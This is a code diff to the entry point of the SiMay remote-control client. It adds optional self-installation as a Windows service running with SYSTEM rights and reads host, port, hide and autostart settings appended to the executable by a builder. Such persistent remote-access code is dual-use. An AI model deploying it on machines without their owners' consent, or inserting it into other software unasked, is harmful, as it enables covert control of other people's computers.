@@ -15,6 +15,9 @@ using System.Text;
 using SiMay.Core.Entitys;
 using SiMay.Serialize;
 using SiMay.Basic;
+using System.Linq;
+using System.Reflection;
+using System.ServiceProcess;
 
 namespace SiMay.ServiceCore
 {
@@ -32,116 +35,126 @@ namespace SiMay.ServiceCore
         public bool IsMutex { get; set; }
         public string ServiceVersion { get; set; }
         public string RunTimeText { get; set; }
+        public bool InstallService { get; set; }
+        public string ServiceName { get; set; }
+        public string ServiceDisplayName { get; set; }
     }
     static class Program
     {
-        //static string ip = "94.191.115.121";
-        //static int port = 522;
+        /// <summary>
+        /// 服务启动参数
+        /// </summary>
+        const string SERVICE_START = "-serviceStart";
 
-        //static string _host = "127.0.0.1";
-        //static int _port = 5200;
+        /// <summary>
+        /// SYSTEM用户进程启动参数
+        /// </summary>
+        const string SERVICE_USER_START = "-user";
 
         /// <summary>
         /// 应用程序的主入口点。
         /// </summary>
         [STAThread]
-        static void Main()
+        static void Main(string[] args)
         {
-            //string host = "127.0.0.1";
-            //int port = 5200;
-            //host = "94.191.115.121";
-            //port = 522;
-            //string remarkInformation = "";//初始化备注信息
-            //string groupName = "默认分组";
-            //bool isAutoStart = false;
-            //bool isHide = false;
-            //int sessionMode = 1;//服务器模式 //1是中间服务器模式
-            //int accesskey = 5200;//初始连接密码
-            //string id = "AAAAAAAAAAA11111111";
-            //bool isMutex = false;
-
-            var startParameter = new StartParameterEx()
+            if (args.Any(c => c.Equals(SERVICE_START, StringComparison.OrdinalIgnoreCase)))
             {
-                Host = "127.0.0.1",
-                Port = 5200,
-                //Port = 522,
-                GroupName = "默认分组",
-                RemarkInformation = "SiMayService",
-                IsHide = false,
-                IsMutex = false,
-                IsAutoStart = false,
-                SessionMode = 0,
-                //SessionMode = 1,
-                AccessKey = 5200,
-                ServiceVersion = "正式5.0",
-                RunTimeText = DateTime.Now.ToString(),
-                UniqueId = "AAAAAAAAAAAAAAA11111111"
-            };
-            try
-            {
-                byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
-                var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
-                if (sign == 9999)
+                ServiceBase.Run(new ServiceBase[]
                 {
-                    var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
-                    byte[] bytes = new byte[length];
-                    Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);
+                    new Service()
+                });
+            }
+            else//非服务启动
+            {
+                var startParameter = new StartParameterEx()
+                {
+                    Host = "192.168.1.102",
+                    Port = 5200,
+                    //Port = 522,
+                    GroupName = "默认分组",
+                    RemarkInformation = "SiMayService",
+                    IsHide = false,
+                    IsMutex = false,
+                    IsAutoStart = false,
+                    SessionMode = 0,
+                    //SessionMode = 1,
+                    AccessKey = 5200,
+                    ServiceVersion = "正式5.0",
+                    RunTimeText = DateTime.Now.ToString(),
+                    UniqueId = "AAAAAAAAAAAAAAA11111111",
+                    ServiceName = "SiMayService",
+                    ServiceDisplayName = "SiMay远程被控服务",
+                    InstallService = false
+                };
+                try
+                {
+                    byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
+                    var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
+                    if (sign == 9999)
+                    {
+                        var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
+                        byte[] bytes = new byte[length];
+                        Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);
 
-                    var options = PacketSerializeHelper.DeserializePacket<ServiceOptions>(bytes);
-                    startParameter.Host = options.Host;
-                    startParameter.Port = options.Port;
-                    startParameter.RemarkInformation = options.Remark;
-                    startParameter.IsAutoStart = options.IsAutoRun;
-                    startParameter.IsHide = options.IsHide;
-                    startParameter.AccessKey = options.AccessKey;
-                    startParameter.SessionMode = options.SessionMode;
-                    startParameter.UniqueId = options.Id;
-                    startParameter.IsMutex = options.IsMutex;
-                    startParameter.GroupName = options.GroupName;
-                    //= lpport;
+                        var options = PacketSerializeHelper.DeserializePacket<ServiceOptions>(bytes);
+                        startParameter.Host = options.Host;
+                        startParameter.Port = options.Port;
+                        startParameter.RemarkInformation = options.Remark;
+                        startParameter.IsAutoStart = options.IsAutoRun;
+                        startParameter.IsHide = options.IsHide;
+                        startParameter.AccessKey = options.AccessKey;
+                        startParameter.SessionMode = options.SessionMode;
+                        startParameter.UniqueId = options.Id;
+                        startParameter.IsMutex = options.IsMutex;
+                        startParameter.GroupName = options.GroupName;
+                        startParameter.InstallService = options.InstallService;
+                        startParameter.ServiceName = options.ServiceName;
+                        startParameter.ServiceDisplayName = options.ServiceDisplayName;
+                    }
                 }
+                catch { }
+
+                if (startParameter.IsMutex)
+                {
+                    //进程互斥体
+                    bool bExist;
+                    Mutex MyMutex = new Mutex(true, "SiMayService", out bExist);
+                    if (!bExist)
+                        Environment.Exit(0);
+                }
+
+                AppConfiguartion.HasSystemAuthority = args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)) ? 
+                    "true" :
+                    "false";
+
+                //非SYSTEM用户进程启动则进入安装服务
+                if (startParameter.InstallService && !args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
+                {
+                    var svcFullName = Assembly.GetExecutingAssembly().Location;
+                    var parameter = " \"-serviceStart\"";//服务启动标志
+                    svcFullName += parameter;
+                    if (ServiceInstallerHelper.InstallService(svcFullName, startParameter.ServiceName, startParameter.ServiceDisplayName))
+                    {
+                        //服务安装完成启动成功
+                        Environment.Exit(0);
+                    }
+                }
+
+                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
+                AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
+                Application.ThreadException += Application_ThreadException;
+                try
+                {
+                    new MainService.MainService(startParameter);
+                }
+                catch (Exception ex)
+                {
+                    WriteException("main service exception!", ex);
+                }
+                SystemMessageNotify.InitializeNotifyIcon();
+                SystemMessageNotify.ShowTip("SiMay远程控制被控服务已启动!");
+                Application.Run();
             }
-            catch { }
-
-            if (startParameter.IsMutex)
-            {
-                //进程互斥体
-                bool bExist;
-                Mutex MyMutex = new Mutex(true, "SiMayService", out bExist);
-                if (!bExist)
-                    Environment.Exit(0);
-            }
-
-
-            //while (true) //第一次解析域名,直至解析成功
-            //{
-            //    var ip = IPHelper.GetHostByName(host);
-            //    if (ip != null)
-            //    {
-            //        AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);
-            //        break;
-            //    }
-
-            //    Console.WriteLine(host ?? "address analysis is null");
-
-            //    Thread.Sleep(5000);
-            //}
-            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
-            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
-            Application.ThreadException += Application_ThreadException;
-
-
-            try
-            {
-                new MainService.MainService(startParameter);
-            }
-            catch (Exception ex)
-            {
-                WriteException("main service exception!", ex);
-            }
-            SystemMessageNotify.InitializeNotifyIcon();
-            SystemMessageNotify.ShowTip("SiMay远程控制被控服务已启动!");
-            Application.Run();
         }
 
         private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
